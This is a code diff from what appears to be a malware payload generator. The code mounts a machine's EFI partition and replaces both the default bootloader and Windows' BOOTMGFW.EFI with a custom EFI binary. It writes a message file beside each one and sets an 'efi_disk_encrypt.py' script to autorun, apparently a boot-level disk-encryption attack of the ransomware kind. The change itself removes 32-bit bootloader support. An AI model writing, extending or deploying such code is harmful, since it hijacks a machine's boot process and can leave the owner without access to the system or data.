@@ -43,7 +43,6 @@ FS_MOUNTPOINT = "/mnt"
 
 PATHS_TO_CHECK = (
     "/mnt/EFI/BOOT/BOOTX64.EFI",
-    "/mnt/EFI/BOOT/BOOTI32.EFI",
     "/mnt/EFI/BOOT/Microsoft/BOOTMGFW.EFI",
     "/mnt/EFI/debian",
     "/mnt/EFI/Microsoft"
@@ -108,16 +107,10 @@ def main():
                     os.makedirs("/mnt/EFI/BOOT")
                     shutil.copy("/root/BOOTX64.EFI",
                                 "/mnt/EFI/BOOT/BOOTX64.EFI")
-                    shutil.copy("/root/BOOTI32.EFI",
-                                "/mnt/EFI/BOOT/BOOTI32.EFI")
                     with open("/mnt/EFI/BOOT/message.txt", "w") as stream:
                         stream.write(MESSAGE)
-                    if platform.machine() == "x86_64":
-                        bootloader = "BOOTX64.EFI"
-                    else:
-                        bootloader = "BOOTI32.EFI"
                     os.mkdir("/mnt/EFI/Microsoft")
-                    shutil.copy(f"/root/{bootloader}",
+                    shutil.copy(f"/root/BOOTX64.EFI",
                                 "/mnt/EFI/Microsoft/BOOTMGFW.EFI")
                     with open("/mnt/EFI/Microsoft/message.txt", "w") as stream:
                         stream.write(MESSAGE)
@@ -157,6 +150,5 @@ def generate(context: dict):
             payload = payload.replace(f"@{inp}@", f"{repr(value)}")
         stream.write(payload)
     shutil.copy(os.path.join(os.path.dirname(__file__), "data", "BOOTX64.EFI"), os.path.join(context["temp_dir"], "root", "BOOTX64.EFI"))
-    shutil.copy(os.path.join(os.path.dirname(__file__), "data", "BOOTI32.EFI"), os.path.join(context["temp_dir"], "root", "BOOTI32.EFI"))
     autorun = Autorun(context)
     autorun.add_executable("/root/efi_disk_encrypt.py")
